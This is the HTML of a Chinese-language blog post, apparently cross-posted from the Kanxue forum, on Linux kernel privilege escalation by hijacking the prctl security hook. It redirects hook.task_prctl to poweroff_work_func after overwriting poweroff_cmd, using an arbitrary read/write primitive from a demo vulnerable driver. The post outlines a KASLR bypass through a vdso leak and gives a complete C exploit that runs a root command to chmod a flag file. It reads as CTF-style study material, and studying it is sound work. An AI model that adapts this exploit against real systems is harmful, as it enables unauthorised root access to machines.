@@ -1,0 +1,506 @@
+<!doctype html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html
+  class="not-ready lg:text-base"
+  style="--bg: #faf8f1"
+  lang="en-us"
+>
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1, shrink-to-fit=no"
+  />
+
+  
+  <title>linux 内核提权总结(demo&#43;exp分析) -- 任意读写(二) - povcfe&#39;s site</title>
+
+  
+  <meta name="theme-color" />
+
+  
+  
+  
+  
+  <meta name="description" content="发表于看雪论坛
+hijack_prctl篇 prctl函数: 用户态函数，可用于定制进程参数，非常适合和内核进行交互
+用户态执行prctl函数后触发prctl系统调用 内核接收参数后执行security_task_prctl security_task_prctl执行hook.task_prctl poweroff_work_func函数: 内核函数，执行 run_cmd(poweroff_cmd)，即root权限执行poweroff_cmd
+攻击流程:
+劫持hook.task_prctl为目标函数地址(poweroff_work_func) 修改poweroff_cmd为目标指令 用户执行prctl函数，触发 一. 利用步骤 1. 定位内核加载基地址(开启kaslr) 同hijack_vdso，泄漏vdso地址，因为内核kaslr开启后，只有较高字节的地址发生偏移，且vdso与基地址相距较近，所以可以使用vdso定位内核加载地址 2. 定位hook.prctl，poweroff_cmd地址 gdb调试内核并在security_task_prctl函数处下断点，用户态程序执行prctl函数，进入security_task_prctl函数，单步执行汇编指令，通过内存查看hook.task_prctl 地址
+gdb 执行 p poweroff_cmd，获得poweroff_cmd真实地址
+获得hook.prctl，poweroff_cmd与内核基地址固定偏移
+3. 修改poweroff_cmd 为任意指令 4. 用户态执行prctl函数，触发 二. 驱动代码(见cred篇) 三. exp #define _GNU_SOURCE #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/ioctl.h&gt; #include &lt;sys/auxv.h&gt; #include &lt;sys/prctl.h&gt; #define CHANGE_POINT 0x100000 #define RW_READ 0x100001 #define RW_WRITE 0x100002 #define SET_MEM 0X100003 size_t poweroff_cmd = 0; size_t prctl_hook = 0; size_t poweroff_work_func = 0; size_t vmlinux_base = 0; struct vunl { char *point; size_t size; } VUNL; void leak_data(int fd, char *buf) { char *res = NULL; VUNL." />
+  <meta name="author" content="povcfe" />
+  
+
+  
+  
+  
+  
+  
+  
+  <link rel="preload stylesheet" as="style" href="https://povcfe.github.io/main.min.css" />
+
+  
+  
+  
+  
+  
+  <link rel="preload" as="image" href="https://povcfe.github.io/theme.png" />
+
+  
+  
+  
+  
+  <link rel="preload" as="image" href="https://povcfe.github.io/avatar.jpg" />
+  
+  
+
+  
+  
+  <link rel="preload" as="image" href="https://povcfe.github.io/twitter.svg" />
+  
+  <link rel="preload" as="image" href="https://povcfe.github.io/github.svg" />
+  
+  <link rel="preload" as="image" href="https://povcfe.github.io/rss.svg" />
+  
+  
+
+  
+  
+  <script
+    defer
+    src="https://povcfe.github.io/highlight.min.js"
+    onload="hljs.initHighlightingOnLoad();"
+  ></script>
+  
+
+  
+  
+  
+
+  
+  <link rel="icon" href="https://povcfe.github.io/favicon.ico" />
+  <link rel="apple-touch-icon" href="https://povcfe.github.io/apple-touch-icon.png" />
+
+  
+  <meta name="generator" content="Hugo 0.111.3">
+
+  
+  
+  
+  
+  
+  <meta itemprop="name" content="linux 内核提权总结(demo&#43;exp分析) -- 任意读写(二)">
+<meta itemprop="description" content="发表于看雪论坛
+hijack_prctl篇 prctl函数: 用户态函数，可用于定制进程参数，非常适合和内核进行交互
+用户态执行prctl函数后触发prctl系统调用 内核接收参数后执行security_task_prctl security_task_prctl执行hook.task_prctl poweroff_work_func函数: 内核函数，执行 run_cmd(poweroff_cmd)，即root权限执行poweroff_cmd
+攻击流程:
+劫持hook.task_prctl为目标函数地址(poweroff_work_func) 修改poweroff_cmd为目标指令 用户执行prctl函数，触发 一. 利用步骤 1. 定位内核加载基地址(开启kaslr) 同hijack_vdso，泄漏vdso地址，因为内核kaslr开启后，只有较高字节的地址发生偏移，且vdso与基地址相距较近，所以可以使用vdso定位内核加载地址 2. 定位hook.prctl，poweroff_cmd地址 gdb调试内核并在security_task_prctl函数处下断点，用户态程序执行prctl函数，进入security_task_prctl函数，单步执行汇编指令，通过内存查看hook.task_prctl 地址
+gdb 执行 p poweroff_cmd，获得poweroff_cmd真实地址
+获得hook.prctl，poweroff_cmd与内核基地址固定偏移
+3. 修改poweroff_cmd 为任意指令 4. 用户态执行prctl函数，触发 二. 驱动代码(见cred篇) 三. exp #define _GNU_SOURCE #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/ioctl.h&gt; #include &lt;sys/auxv.h&gt; #include &lt;sys/prctl.h&gt; #define CHANGE_POINT 0x100000 #define RW_READ 0x100001 #define RW_WRITE 0x100002 #define SET_MEM 0X100003 size_t poweroff_cmd = 0; size_t prctl_hook = 0; size_t poweroff_work_func = 0; size_t vmlinux_base = 0; struct vunl { char *point; size_t size; } VUNL; void leak_data(int fd, char *buf) { char *res = NULL; VUNL."><meta itemprop="datePublished" content="2020-01-30T00:00:00-04:00" />
+<meta itemprop="dateModified" content="2020-01-30T00:00:00-04:00" />
+<meta itemprop="wordCount" content="281">
+<meta itemprop="keywords" content="" />
+  
+  <meta property="og:title" content="linux 内核提权总结(demo&#43;exp分析) -- 任意读写(二)" />
+<meta property="og:description" content="发表于看雪论坛
+hijack_prctl篇 prctl函数: 用户态函数，可用于定制进程参数，非常适合和内核进行交互
+用户态执行prctl函数后触发prctl系统调用 内核接收参数后执行security_task_prctl security_task_prctl执行hook.task_prctl poweroff_work_func函数: 内核函数，执行 run_cmd(poweroff_cmd)，即root权限执行poweroff_cmd
+攻击流程:
+劫持hook.task_prctl为目标函数地址(poweroff_work_func) 修改poweroff_cmd为目标指令 用户执行prctl函数，触发 一. 利用步骤 1. 定位内核加载基地址(开启kaslr) 同hijack_vdso，泄漏vdso地址，因为内核kaslr开启后，只有较高字节的地址发生偏移，且vdso与基地址相距较近，所以可以使用vdso定位内核加载地址 2. 定位hook.prctl，poweroff_cmd地址 gdb调试内核并在security_task_prctl函数处下断点，用户态程序执行prctl函数，进入security_task_prctl函数，单步执行汇编指令，通过内存查看hook.task_prctl 地址
+gdb 执行 p poweroff_cmd，获得poweroff_cmd真实地址
+获得hook.prctl，poweroff_cmd与内核基地址固定偏移
+3. 修改poweroff_cmd 为任意指令 4. 用户态执行prctl函数，触发 二. 驱动代码(见cred篇) 三. exp #define _GNU_SOURCE #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/ioctl.h&gt; #include &lt;sys/auxv.h&gt; #include &lt;sys/prctl.h&gt; #define CHANGE_POINT 0x100000 #define RW_READ 0x100001 #define RW_WRITE 0x100002 #define SET_MEM 0X100003 size_t poweroff_cmd = 0; size_t prctl_hook = 0; size_t poweroff_work_func = 0; size_t vmlinux_base = 0; struct vunl { char *point; size_t size; } VUNL; void leak_data(int fd, char *buf) { char *res = NULL; VUNL." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://povcfe.github.io/post/kernel_rw2/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2020-01-30T00:00:00-04:00" />
+<meta property="article:modified_time" content="2020-01-30T00:00:00-04:00" />
+
+  
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="linux 内核提权总结(demo&#43;exp分析) -- 任意读写(二)"/>
+<meta name="twitter:description" content="发表于看雪论坛
+hijack_prctl篇 prctl函数: 用户态函数，可用于定制进程参数，非常适合和内核进行交互
+用户态执行prctl函数后触发prctl系统调用 内核接收参数后执行security_task_prctl security_task_prctl执行hook.task_prctl poweroff_work_func函数: 内核函数，执行 run_cmd(poweroff_cmd)，即root权限执行poweroff_cmd
+攻击流程:
+劫持hook.task_prctl为目标函数地址(poweroff_work_func) 修改poweroff_cmd为目标指令 用户执行prctl函数，触发 一. 利用步骤 1. 定位内核加载基地址(开启kaslr) 同hijack_vdso，泄漏vdso地址，因为内核kaslr开启后，只有较高字节的地址发生偏移，且vdso与基地址相距较近，所以可以使用vdso定位内核加载地址 2. 定位hook.prctl，poweroff_cmd地址 gdb调试内核并在security_task_prctl函数处下断点，用户态程序执行prctl函数，进入security_task_prctl函数，单步执行汇编指令，通过内存查看hook.task_prctl 地址
+gdb 执行 p poweroff_cmd，获得poweroff_cmd真实地址
+获得hook.prctl，poweroff_cmd与内核基地址固定偏移
+3. 修改poweroff_cmd 为任意指令 4. 用户态执行prctl函数，触发 二. 驱动代码(见cred篇) 三. exp #define _GNU_SOURCE #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/ioctl.h&gt; #include &lt;sys/auxv.h&gt; #include &lt;sys/prctl.h&gt; #define CHANGE_POINT 0x100000 #define RW_READ 0x100001 #define RW_WRITE 0x100002 #define SET_MEM 0X100003 size_t poweroff_cmd = 0; size_t prctl_hook = 0; size_t poweroff_work_func = 0; size_t vmlinux_base = 0; struct vunl { char *point; size_t size; } VUNL; void leak_data(int fd, char *buf) { char *res = NULL; VUNL."/>
+
+  
+  
+  
+  <link rel="canonical" href="https://povcfe.github.io/post/kernel_rw2/" />
+  
+  
+</head>
+
+  <body class="text-black duration-200 ease-out dark:text-white">
+    <header class="mx-auto flex h-[4.5rem] max-w-3xl px-8 lg:justify-center">
+  <div class="relative z-50 mr-auto flex items-center">
+    <a
+      class="-translate-x-[1px] -translate-y-[1px] text-2xl font-semibold"
+      href="https://povcfe.github.io/"
+      >povcfe&#39;s site</a
+    >
+    <div
+      class="btn-dark text-[0] ml-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]"
+      role="button"
+      aria-label="Dark"
+    ></div>
+  </div>
+
+  <div
+    class="btn-menu relative z-50 -mr-8 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
+    role="button"
+    aria-label="Menu"
+  ></div>
+
+  
+
+  <script>
+    
+    const htmlClass = document.documentElement.classList;
+    setTimeout(() => {
+      htmlClass.remove('not-ready');
+    }, 10);
+
+    
+    const btnMenu = document.querySelector('.btn-menu');
+    btnMenu.addEventListener('click', () => {
+      htmlClass.toggle('open');
+    });
+
+    
+    const metaTheme = document.querySelector('meta[name="theme-color"]');
+    const lightBg = '#faf8f1'.replace(/"/g, '');
+    const setDark = (isDark) => {
+      metaTheme.setAttribute('content', isDark ? '#000' : lightBg);
+      htmlClass[isDark ? 'add' : 'remove']('dark');
+      localStorage.setItem('dark', isDark);
+    };
+
+    
+    const darkScheme = window.matchMedia('(prefers-color-scheme: dark)');
+    if (htmlClass.contains('dark')) {
+      setDark(true);
+    } else {
+      const darkVal = localStorage.getItem('dark');
+      setDark(darkVal ? darkVal === 'true' : darkScheme.matches);
+    }
+
+    
+    darkScheme.addEventListener('change', (event) => {
+      setDark(event.matches);
+    });
+
+    
+    const btnDark = document.querySelector('.btn-dark');
+    btnDark.addEventListener('click', () => {
+      setDark(localStorage.getItem('dark') !== 'true');
+    });
+  </script>
+
+  <div
+    class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full select-none flex-col justify-center pb-16 duration-200 dark:bg-black lg:static lg:h-auto lg:flex-row lg:!bg-transparent lg:pb-0 lg:transition-none"
+  >
+    
+    
+
+    
+    <nav
+      class="mt-12 flex justify-center space-x-10 dark:invert lg:ml-12 lg:mt-0 lg:items-center lg:space-x-6"
+    >
+      
+      <a
+        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
+        style="--url: url(./twitter.svg)"
+        href="https://twitter.com/povcfe"
+        target="_blank"
+        rel="me"
+      >
+        twitter
+      </a>
+      
+      <a
+        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
+        style="--url: url(./github.svg)"
+        href="https://github.com/povcfe"
+        target="_blank"
+        rel="me"
+      >
+        github
+      </a>
+      
+      <a
+        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
+        style="--url: url(./rss.svg)"
+        href="https://povcfe.github.io/index.xml"
+        target="_blank"
+        rel="alternate"
+      >
+        rss
+      </a>
+      
+    </nav>
+    
+  </div>
+</header>
+
+
+    <main
+      class="prose prose-neutral relative mx-auto min-h-[calc(100%-9rem)] max-w-3xl px-8 pb-16 pt-12 dark:prose-invert"
+    >
+      
+
+<article>
+  <header class="mb-16">
+    <h1 class="!my-0 pb-2.5">linux 内核提权总结(demo&#43;exp分析) -- 任意读写(二)</h1>
+
+    
+    <div class="text-sm antialiased opacity-60">
+      
+      <time>Jan 30, 2020</time>
+      
+      
+      
+      
+    </div>
+    
+  </header>
+
+  <section><p><a href="https://bbs.pediy.com/user-839858.htm">发表于看雪论坛</a></p>
+<h2 id="hijack_prctl篇">hijack_prctl篇</h2>
+<ul>
+<li>
+<p>prctl函数: 用户态函数，可用于定制进程参数，非常适合和内核进行交互</p>
+<ol>
+<li>用户态执行prctl函数后触发prctl系统调用</li>
+<li>内核接收参数后执行security_task_prctl</li>
+<li>security_task_prctl执行hook.task_prctl</li>
+</ol>
+</li>
+<li>
+<p>poweroff_work_func函数: 内核函数，执行 run_cmd(poweroff_cmd)，即root权限执行poweroff_cmd</p>
+</li>
+<li>
+<p>攻击流程:</p>
+<ol>
+<li>劫持hook.task_prctl为目标函数地址(poweroff_work_func)</li>
+<li>修改poweroff_cmd为目标指令</li>
+<li>用户执行prctl函数，触发</li>
+</ol>
+</li>
+</ul>
+<h3 id="一-利用步骤">一. 利用步骤</h3>
+<h4 id="1-定位内核加载基地址开启kaslr">1. 定位内核加载基地址(开启kaslr)</h4>
+<ul>
+<li>同hijack_vdso，泄漏vdso地址，因为内核kaslr开启后，只有较高字节的地址发生偏移，且vdso与基地址相距较近，所以可以使用vdso定位内核加载地址</li>
+</ul>
+<h4 id="2-定位hookprctlpoweroff_cmd地址">2. 定位hook.prctl，poweroff_cmd地址</h4>
+<ul>
+<li>
+<p>gdb调试内核并在security_task_prctl函数处下断点，用户态程序执行prctl函数，进入security_task_prctl函数，单步执行汇编指令，通过内存查看hook.task_prctl 地址</p>
+</li>
+<li>
+<p>gdb 执行 p poweroff_cmd，获得poweroff_cmd真实地址</p>
+</li>
+<li>
+<p>获得hook.prctl，poweroff_cmd与内核基地址固定偏移</p>
+</li>
+</ul>
+<h4 id="3-修改poweroff_cmd-为任意指令">3. 修改poweroff_cmd 为任意指令</h4>
+<h4 id="4-用户态执行prctl函数触发">4. 用户态执行prctl函数，触发</h4>
+<h3 id="二-驱动代码见cred篇">二. 驱动代码(见cred篇)</h3>
+<h3 id="三-exp">三. exp</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define _GNU_SOURCE
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/ioctl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/auxv.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/prctl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define CHANGE_POINT 0x100000
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define RW_READ 0x100001
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define RW_WRITE 0x100002
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define SET_MEM 0X100003
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">size_t</span> poweroff_cmd <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">size_t</span> prctl_hook <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">size_t</span> poweroff_work_func <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">size_t</span> vmlinux_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> vunl
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>point;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> size;
+</span></span><span style="display:flex;"><span>} VUNL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">leak_data</span>(<span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>res <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    VUNL.size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">size_t</span> addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff80000000</span>; addr <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0xffffffffffffffff</span>; addr <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x1000</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        VUNL.point <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)addr;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ioctl</span>(fd, CHANGE_POINT, <span style="color:#f92672">&amp;</span>VUNL); <span style="color:#75715e">//change the point
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">ioctl</span>(fd, RW_READ, buf);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(<span style="color:#e6db74">&#34;gettimeofday&#34;</span>, buf <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2b5</span>))
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] the addr of VDSO is: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, addr);
+</span></span><span style="display:flex;"><span>            vmlinux_base <span style="color:#f92672">=</span> addr <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffffff000000</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] the addr of vmlinux base is: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, vmlinux_base);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[-] not found, try again!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[])
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x1000</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> cmd[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/bin/chmod 777 /flag</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/dev/rw_any_dev&#34;</span>, O_RDWR);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">leak_data</span>(fd, buf);
+</span></span><span style="display:flex;"><span>    poweroff_cmd <span style="color:#f92672">=</span> vmlinux_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe3e1a0</span>;
+</span></span><span style="display:flex;"><span>    prctl_hook <span style="color:#f92672">=</span> vmlinux_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe81078</span>;
+</span></span><span style="display:flex;"><span>    poweroff_work_func <span style="color:#f92672">=</span> vmlinux_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x075480</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] the addr of poweroff_cmd is: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, poweroff_cmd);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] the addr of prctl hook is: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, prctl_hook);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] the addr of orderly_poweroff is: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, poweroff_work_func);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    VUNL.size <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(cmd)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// VUNL.size = strlen(argv[1])+1;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    VUNL.point <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)poweroff_cmd;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ioctl</span>(fd, CHANGE_POINT, <span style="color:#f92672">&amp;</span>VUNL);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ioctl</span>(fd, RW_WRITE, cmd);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// ioctl(fd, RW_WRITE, argv[1]);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    VUNL.size <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>;
+</span></span><span style="display:flex;"><span>    VUNL.point <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)prctl_hook;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ioctl</span>(fd, CHANGE_POINT, <span style="color:#f92672">&amp;</span>VUNL);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ioctl</span>(fd, RW_WRITE, <span style="color:#f92672">&amp;</span>poweroff_work_func);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[+] the cmd arg must have an ansolute_address&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">prctl</span>(PR_GET_NAME, <span style="color:#e6db74">&#34;test&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></section>
+
+  
+  
+
+  
+  
+  
+  
+  <nav class="mt-24 flex rounded-lg bg-black/[3%] text-lg dark:bg-white/[8%]">
+    
+    <a
+      class="flex w-1/2 items-center rounded-l-md p-6 pr-3 font-semibold no-underline hover:bg-black/[2%] dark:hover:bg-white/[3%]"
+      href="https://povcfe.github.io/post/kernel_rw3/"
+      ><span class="mr-1.5">←</span><span>linux 内核提权总结(demo&#43;exp分析) -- 任意读写(三)</span></a
+    >
+    
+    
+    <a
+      class="ml-auto flex w-1/2 items-center justify-end rounded-r-md p-6 pl-3 font-semibold no-underline hover:bg-black/[2%] dark:hover:bg-white/[3%]"
+      href="https://povcfe.github.io/post/kernel_rw1/"
+      ><span>linux 内核提权总结(demo&#43;exp分析) -- 任意读写(一)</span><span class="ml-1.5">→</span></a
+    >
+    
+  </nav>
+  
+  
+
+  
+  
+
+  
+  
+
+  
+
+
+  
+</article>
+
+
+    </main>
+
+    <footer
+  class="opaco mx-auto flex h-[4.5rem] max-w-3xl items-center px-8 text-[0.9em] opacity-60"
+>
+  <div class="mr-auto">
+    &copy; 2024
+    <a class="link" href="https://povcfe.github.io/">povcfe&#39;s site</a>
+  </div>
+  <a class="link mx-6" href="https://gohugo.io/" rel="noopener" target="_blank"
+    >Powered by Hugo️️</a
+  >️
+  <a
+    class="link"
+    href="https://github.com/nanxiaobei/hugo-paper"
+    rel="noopener"
+    target="_blank"
+    >✎ Paper</a
+  >
+</footer>
+
+  </body>
+</html>
